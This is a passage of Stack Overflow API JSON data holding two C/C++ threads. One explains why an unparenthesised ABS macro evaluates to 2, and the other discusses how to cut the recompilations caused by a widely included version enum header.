1447262317, "post_id": 33655982, "comment_id": 55085436, "body": "Then I guess we should expand it.. Wait for an update."}, {"owner": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "edited": false, "score": 0, "creation_date": 1447263264, "post_id": 33655982, "comment_id": 55086006, "body": "Thanks man... let me try to understand it. I can&#39;t even believe this apeared in our exam!"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "edited": false, "score": 0, "creation_date": 1447263400, "post_id": 33655982, "comment_id": 55086093, "body": "Are you sure it wasn&#39;t parenthesized in the exam? I believe the desirable answer there was <code>1</code> .."}], "tags": [], "owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "is_accepted": true, "score": 2, "last_activity_date": 1447263057, "last_edit_date": 1447263057, "creation_date": 1447261960, "answer_id": 33655982, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33655982#33655982", "title": "macro producing wrong number", "body": "<p>There is a problem with parentheses. If you expand the macro, you will get a complex nested ternary operations, which evaluate to <code>2</code> (See the expansion in the update). In order to get a desirable result surround the macro with parenthesis.</p>\n\n<p><strong>Update</strong>: The manual expansion:</p>\n\n<pre><code>ABS(ABS(-2)-(ABS(-3)))\n</code></pre>\n\n<p>expands to:</p>\n\n<pre><code>((ABS(-2)-(ABS(-3))) &lt; 0) ? -(ABS(-2)-(ABS(-3))) : (ABS(-2)-(ABS(-3)))\n</code></pre>\n\n<p><code>ABS(-3)</code> is surrounded by parentheses everywhere, so it is safely evaluated to <code>3</code>, so no need to expand it. So we end up:</p>\n\n<pre><code>(( ((-2) &lt; 0) ? -(-2) : (-2) - 3) &lt; 0) ? -(ABS(-2)-3) : (ABS(-2)-3)\n</code></pre>\n\n<p><code>(ABS(-2)-3)</code> will expand to </p>\n\n<pre><code>((-2) &lt; 0) ? -(-2) : (-2) - 3 = 2\n</code></pre>\n\n<p>Evaluating the whole:\n<code>(( true ? 2 : -5 &lt; 0) ? -2 : 2</code>\nor </p>\n\n<p><code>(2 &lt; 0) ? -2 : 2 = 2</code>\nAnd it is the observed result, hope it is followable.</p>\n\n<p>which is eno</p>\n"}, {"comments": [{"owner": {"reputation": 1440, "user_id": 1836773, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/82a56c6859887a3fb3ea1fc11a881978?s=128&d=identicon&r=PG", "display_name": "victor", "link": "https://stackoverflow.com/users/1836773/victor"}, "edited": false, "score": 1, "creation_date": 1447262061, "post_id": 33656003, "comment_id": 55085275, "body": "This will indeed output 1, but the question is: why? hehe"}], "tags": [], "owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "is_accepted": false, "score": 3, "last_activity_date": 1447262134, "last_edit_date": 1447262134, "creation_date": 1447262011, "answer_id": 33656003, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33656003#33656003", "title": "macro producing wrong number", "body": "<p>You forgot the outer parenthesis, try this:</p>\n\n<pre><code>#define ABS(x) (((x) &lt; 0) ? -(x) : (x))\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1440, "user_id": 1836773, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/82a56c6859887a3fb3ea1fc11a881978?s=128&d=identicon&r=PG", "display_name": "victor", "link": "https://stackoverflow.com/users/1836773/victor"}, "edited": false, "score": 1, "creation_date": 1447262177, "post_id": 33656036, "comment_id": 55085351, "body": "It is not lacking a parenthesis"}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447262353, "post_id": 33656036, "comment_id": 55085463, "body": "There is no missing parenthesis. You broke the code. That doesn&#39;t compile anymore."}], "tags": [], "owner": {"reputation": 10300, "user_id": 2469027, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b62ce55f4f1a0eff6775e7863850a912?s=128&d=identicon&r=PG", "display_name": "Edward Karak", "link": "https://stackoverflow.com/users/2469027/edward-karak"}, "is_accepted": false, "score": 1, "last_activity_date": 1447262106, "creation_date": 1447262106, "answer_id": 33656036, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33656036#33656036", "title": "macro producing wrong number", "body": "<pre><code>#include &lt;stdio.h&gt;\n#define ABS(x) ((x) &lt; 0) ? -(x) : (x))\nint main()\n{\n    printf( \"%d\", ABS( ABS(-2) - ABS(-3) ) );\n    return 0;\n}\n</code></pre>\n\n<p>You forgot the closing right parenthesis <code>)</code> in your <code>#define</code>.</p>\n\n<p>Also, <code>return</code> needs to be lowercase</p>\n\n<p>I put spaces, so you can see the grouping more clearly.</p>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": false, "score": 1, "last_activity_date": 1447263437, "creation_date": 1447263437, "answer_id": 33656463, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33656463#33656463", "title": "macro producing wrong number", "body": "<p>in <a href=\"http://coliru.stacked-crooked.com/a/59700f453a1dcaf9\" rel=\"nofollow\">http://coliru.stacked-crooked.com/a/59700f453a1dcaf9</a> with compile option -E </p>\n\n<p>the gcc preprocessor has resolved this:</p>\n\n<pre><code>printf(\"%d\\n\", ABS(ABS(-2)-(ABS(-3))));\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>printf(\"%d\\n\", ((((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3))) &lt; 0) ? -(((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3))) : (((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3))));\n</code></pre>\n\n<p>check it your self</p>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1447263486, "creation_date": 1447263486, "answer_id": 33656486, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33656486#33656486", "title": "macro producing wrong number", "body": "<p>You need parenthesis around the expression that <code>ABS</code> defines. Instead of</p>\n\n<pre><code>#define ABS(x) ((x) &lt; 0) ? -(x) : (x)\n</code></pre>\n\n<p>you need:</p>\n\n<pre><code>#define ABS(x) (((x) &lt; 0) ? -(x) : (x))\n               ^----------------------^\n</code></pre>\n\n<p>Without that, the expression <code>ABS(ABS(-2)-(ABS(-3)))</code> expands to:</p>\n\n<pre><code>((((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3))) &lt; 0) ?  -(((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3))) : (((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ? -(-3) : (-3)))\n</code></pre>\n\n<p>That will be a tough one to analyze to understand what went wrong. However, if you look at the start of the expression, you will see that first term runs into the second term.</p>\n\n<pre><code>((-2) &lt; 0) ? -(-2) : (-2)-(((-3) &lt; 0) ...\n                         ^^ (-2) Runs into the next term\n</code></pre>\n\n<p>The value of the expression is hard to predict. If you add parenthesis around the expression that the macro defines, you will see:</p>\n\n<pre><code>( (((-2) &lt; 0) ? -(-2) : (-2)) - ( (((-3) &lt; 0) ...\n  ^ ------ one term ------- ^ There is no running in to the next term.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 1, "last_activity_date": 1447263568, "creation_date": 1447263568, "answer_id": 33656504, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number/33656504#33656504", "title": "macro producing wrong number", "body": "<p>Let's expand that macro out by hand:</p>\n\n<pre><code>ABS(-3) == ((-3) &lt; 0) ? -(-3) : (-3)\nABS(-2) == ((-2) &lt; 0) ? -(-2) : (-2)\n\nABS(-2) - ABS(-3) ==\n  ((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3)\n</code></pre>\n\n<p>Now we have a problem: binary <code>-</code> has higher precedence than <code>?:</code>, so the above is being <em>parsed</em> as:</p>\n\n<pre><code>((-2) &lt; 0) ? -(-2) : \n  ((-2) - ((-3) &lt; 0) ? -(-3) : (-3))\n</code></pre>\n\n<p>Since <code>(-2) &lt; 0</code> is true, we evaluate <code>-(-2)</code>.  Then:</p>\n\n<pre><code>ABS( ABS(-2) - ABS(-3) ) ==\n  ((((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3)) &lt; 0 ?\n    -(((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3)) :\n    (((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3))\n</code></pre>\n\n<p>We've already established that </p>\n\n<pre><code>((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3)\n</code></pre>\n\n<p>evaluates to <code>2</code>, so the expression </p>\n\n<pre><code>(((-2) &lt; 0) ? -(-2) : (-2) - ((-3) &lt; 0) ? -(-3) : (-3))\n</code></pre>\n\n<p>gets evaluated, and, guess what?  It evaluates to <code>2</code>.</p>\n\n<p>What you need to do is change your macro as follows:</p>\n\n<pre><code>ABS(x) ( (x) &lt; 0 ? -(x) : (x) )\n</code></pre>\n\n<p>Then everything expands out as</p>\n\n<pre><code>ABS(-3) == ((-3) &lt; 0 ? -(-3) : (-3))\nABS(-2) == ((-2) &lt; 0 ? -(-2) : (-2))\n\nABS(-2) - ABS(-3) ==\n  ((-2) &lt; 0 ? -(-2) : (-2)) - ((-3) &lt; 0 ? -(-3) : (-3))\n\nABS(ABS(-2) - ABS(-3)) ==\n  (((-2) &lt; 0 ? -(-2) : (-2)) - ((-3) &lt; 0 ? -(-3) : (-3)) &lt; 0 ?\n    -(((-2) &lt; 0 ? -(-2) : (-2)) - ((-3) &lt; 0 ? -(-3) : (-3))) :\n     ((-2) &lt; 0 ? -(-2) : (-2)) - ((-3) &lt; 0 ? -(-3) : (-3))\n</code></pre>\n\n<p>This time, </p>\n\n<pre><code>(((-2) &lt; 0 ? -(-2) : (-2)) - ((-3) &lt; 0 ? -(-3) : (-3))\n</code></pre>\n\n<p>evaluates to <code>-1</code>.  </p>\n\n<p>The rest should be clear from here.</p>\n\n<p>You should <em>always</em> wrap expression macro bodies in an outer pair of parentheses for exactly this reason.</p>\n"}], "owner": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 33655982, "answer_count": 6, "score": 6, "last_activity_date": 1447263568, "creation_date": 1447261748, "last_edit_date": 1447262174, "question_id": 33655912, "link": "https://stackoverflow.com/questions/33655912/macro-producing-wrong-number", "title": "macro producing wrong number", "body": "<p>I can't understand why the following code prints 2 instead of 1...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define ABS(x) ((x) &lt; 0) ? -(x) : (x)\nint main()\n{\n    printf(\"%d\", ABS(ABS(-2)-(ABS(-3))));\n    return 0;\n}\n</code></pre>\n\n<p>This question was on our exam and I answered the output is 1 but after compiling I get 2... Would anyone please explain what the expression actually do... Thanks in advance.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 4, "creation_date": 1447261818, "post_id": 33655770, "comment_id": 55085131, "body": "Could you just use an integer instead of the enum, and use eg. <code>if (v &gt;= 30) {</code> instead of <code>if (v &gt;= v30) {</code>?"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447261999, "post_id": 33655770, "comment_id": 55085236, "body": "In any case, there is no real dependency on <code>version.h</code>, unless an edit <i>re-orders</i> the enum, which seems like it would be outside of the anticipated behaviour (and thus cause for <code>make clean</code>)."}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447262581, "post_id": 33655770, "comment_id": 55085571, "body": "@Dmitri the labels (like v30) are more complicated, and do not easily translate to numbers. I used v1-v100 for simplicity"}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447263158, "post_id": 33655770, "comment_id": 55085943, "body": "Well, each of your other files gets recompiled because it <code>#include</code>s a file you&#39;ve modified, not because they use the enum per se.  But if you can&#39;t either get rid of the <code>#include</code> or stop modifying that header (or dependencies of that header), the problem will persist.  You could split the <code>read</code> functions to different source files so that less code gets recompiled, I guess."}, {"owner": {"reputation": 25063, "user_id": 3313064, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GBXlB.jpg?s=128&g=1", "display_name": "Christian Hackl", "link": "https://stackoverflow.com/users/3313064/christian-hackl"}, "edited": false, "score": 0, "creation_date": 1447263293, "post_id": 33655770, "comment_id": 55086021, "body": "Who is John Lakos, what are you citing and where is the figure the author is talking about?"}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 25063, "user_id": 3313064, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GBXlB.jpg?s=128&g=1", "display_name": "Christian Hackl", "link": "https://stackoverflow.com/users/3313064/christian-hackl"}, "edited": false, "score": 0, "creation_date": 1447263750, "post_id": 33655770, "comment_id": 55086293, "body": "@ChristianHackl : He&#39;s the author of the classic book &#39;Large Scale C++ Software Design&#39;. <a href=\"http://www.informit.com/articles/article.aspx?p=2088514\" rel=\"nofollow noreferrer\">informit.com/articles/article.aspx?p=2088514</a>"}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447265106, "post_id": 33655770, "comment_id": 55087097, "body": "@Dmitri this is not an effective solution. Every day, one of 100 programmers changes one of 600 of these type*.cpp files, causing 600 files to recompile for each of the 100 programmers. I really need to take this number down to 1-2 files."}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 25063, "user_id": 3313064, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GBXlB.jpg?s=128&g=1", "display_name": "Christian Hackl", "link": "https://stackoverflow.com/users/3313064/christian-hackl"}, "edited": false, "score": 0, "creation_date": 1447265520, "post_id": 33655770, "comment_id": 55087349, "body": "@ChristianHackl here&#39;s a free copy for you... <a href=\"http://cs.brown.edu/courses/cs190/2008/documents/lakos/chapter0.pdf\" rel=\"nofollow noreferrer\">cs.brown.edu/courses/cs190/2008/documents/lakos/chapter0.pdf</a>"}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 1, "creation_date": 1447265611, "post_id": 33655770, "comment_id": 55087401, "body": "Use macros instead of enum labels, and multiple headers (one per version, eg. version_v1.h, version_v2.h, etc.).  Each header can #include the previous and define its macro in terms of the previous (eg. <code>#include &quot;version_v29.h&quot;</code> then <code>#define v30 (v29+1)</code>, and each source file can include just the header for the minimum version it requires.  That way only sources needing a new version depend on a new or changed header.  Of course, that could make a lot of work for the preprocessor.."}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447266158, "post_id": 33655770, "comment_id": 55087750, "body": "@Dmitri (+1) good idea if you don&#39;t mind about exploding the enum into many files. Unfortunately there is a reason for the enum, in that it keeps all the relevant entries together. If you allow to create one file for each version, the chain might be broken accidentally into 2 tails, and you might never see it. The entries in the enum are helpful, because if 2 programmers try to create a new Version entry, the VCS will stop due to the conflict in code"}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447267022, "post_id": 33655770, "comment_id": 55088326, "body": "If you&#39;re using GNU make, try it with <code>-o version.h</code>?"}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "reply_to_user": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447331834, "post_id": 33655770, "comment_id": 55115835, "body": "@Dmitri you mean like <code>g++ typeA.cpp -o version.h</code> ?  what&#39;s that good for ? Can you try to clarify your suggestion please ?"}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1447347643, "post_id": 33655770, "comment_id": 55127125, "body": "Not <code>-o</code> for <i>g++</i>, <code>-o</code> for <i>make</i>... it makes make treat the file as if it were old, so other targets won&#39;t get rebuilt because it has changed (at least according to the docs... I haven&#39;t used that feature personally)."}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1447262221, "post_id": 33655958, "comment_id": 55085376, "body": "By &quot;each of the other source files reads that configuration file&quot;, I suppose you mean that the functions in each source file read the configuration file <i>at run time</i>, or something to that general effect.  Yes?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1447262784, "post_id": 33655958, "comment_id": 55085687, "body": "Yes, exactly, each source file opens the configuration file for reading, reads the contents, parses the contents, uses the contents"}, {"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "edited": false, "score": 0, "creation_date": 1447262872, "post_id": 33655958, "comment_id": 55085748, "body": "Can you provide an example for that please ? I am not sure I follow."}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1447261890, "creation_date": 1447261890, "answer_id": 33655958, "question_id": 33655770, "link": "https://stackoverflow.com/questions/33655770/enum-in-header-causes-excessive-recompilations/33655958#33655958", "title": "enum in header causes excessive recompilations", "body": "<p>You can place the enum in a separate .cfg file, as configuration data, then each of the other source files reads that configuration file.  </p>\n\n<p>Then when the configuration file is changed, no re-compile is needed.  </p>\n\n<p>All the other files read/parse the configuration file.</p>\n\n<p>This is the classic method of handling such info.</p>\n\n<p>Note: the configuration file would not contain an enum but rather certain formatted data.</p>\n"}, {"comments": [{"owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "edited": false, "score": 0, "creation_date": 1447332315, "post_id": 33658485, "comment_id": 55116146, "body": "If I do that, then I couple this file with <i>all</i> the &quot;ObjectXXX.h&quot; files. I will have reduced the effect of change on &quot;version.h&quot; on the system, but &quot;readObject.cpp&quot; will have thousands more reasons to recompile. However, there <i>are</i> gains with this method."}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "reply_to_user": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "edited": false, "score": 0, "creation_date": 1447333009, "post_id": 33658485, "comment_id": 55116566, "body": "@Grim Fandango: Yes, but at least it is 1 file.. All the untoched ObjectX.cpp would not recompile."}], "tags": [], "owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "is_accepted": false, "score": 1, "last_activity_date": 1447270632, "creation_date": 1447270632, "answer_id": 33658485, "question_id": 33655770, "link": "https://stackoverflow.com/questions/33655770/enum-in-header-causes-excessive-recompilations/33658485#33658485", "title": "enum in header causes excessive recompilations", "body": "<p>I'm not sure to understand your versioning system. Can't you decouple the objects definitions from the reading?</p>\n\n<pre><code>// ObjectA.cpp\n\n#include\"ObjectA.h\"  \n\n// define ObjectA\n\nvoid ObjectA::setPar ( float xx, float yy, float zz) \n{\n    x = v[0];\n    y = v[1];\n    z = v[2]; \n}\n</code></pre>\n\n<p>then</p>\n\n<pre><code>// typeB.cpp\n\n#include\"ObjectB.h\"  \n\n// define ObjectB\n\nvoid ObjectB::setPar ( float mm, float vv, color cc) \n{\n    mass = mm;\n    velocity = vv;\n    color = cc; \n}\n</code></pre>\n\n<p>then in one (big) file</p>\n\n<pre><code>// readObject.cpp\n\n#include\"version.h\"\n#include\"ObjectA.h\"\n#include\"ObjectB.h\"\n\nvoid read (FILE *f, ObjectA *p, Version v) \n{\n    float x,y,z;\n    read_float(f, x);\n    read_float(f, y);\n    if (v &gt;= v100) { \n        read_float(f, z);  // after v100 ObjectA becomes a 3D\n    } else z=0.0;          // whatever\n    p-&gt;setPar(x,y,z);\n}\n\nvoid read (FILE *f, ObjectB *p, Version v)\n{\n    ...\n}\n</code></pre>\n"}], "owner": {"reputation": 2001, "user_id": 383689, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0c2bbd52fe81c4908f89636976ba8712?s=128&d=identicon&r=PG", "display_name": "Grim Fandango", "link": "https://stackoverflow.com/users/383689/grim-fandango"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 0, "answer_count": 2, "score": 4, "last_activity_date": 1447270632, "creation_date": 1447261301, "last_edit_date": 1447262483, "question_id": 33655770, "link": "https://stackoverflow.com/questions/33655770/enum-in-header-causes-excessive-recompilations", "title": "enum in header causes excessive recompilations", "body": "<blockquote>\n  <p>John Lakos refers to this problem as <em>an insidious source of\n  compile-time coupling</em> (Figure 0-3, in his Introduction):</p>\n</blockquote>\n\n<p>The problem I am facing is that too many files get compiled because there is a physical dependency on a single enum.</p>\n\n<p>I have a header with the enum definition:</p>\n\n<pre><code>// version.h\nenum Version {\n    v1 = 1,\n    v2, v3, v4, v5, ... v100\n};\n</code></pre>\n\n<p>and this is used by hundreds of files.\nEach file defines a class of objects, which have to be read from the disk,\nusing the <code>read()</code> function. <code>Version</code> is used to determine the way data is to be read.</p>\n\n<p>Every time a new class or class member is introduced, a new entry is appended to the enum </p>\n\n<pre><code>// typeA.cpp\n#include \"version.h\"\n\nvoid read (FILE *f, ObjectA *p, Version v) \n{\n    read_float(f, &amp;p-&gt;x);\n    read_float(f, &amp;p-&gt;y);\n    if (v &gt;= v100) { \n        read_float(f, &amp;p-&gt;z);  // after v100 ObjectA becomes a 3D\n    }\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>// typeB.cpp\n#include \"version.h\"\n\nvoid read (FILE *f, ObjectB *p, Version v)\n{\n    read_float (f, &amp;p-&gt;mass);\n    if (v &gt;= v30) {\n        read_float (f, &amp;p-&gt;velocity);\n    }\n    if (v &gt;= v50) {\n        read_color (f, &amp;p-&gt;color);\n    }\n}\n</code></pre>\n\n<p>Now, as you can see, once <code>ObjectA</code> changes, we have to introduce  a new entry (say <code>v100</code>) 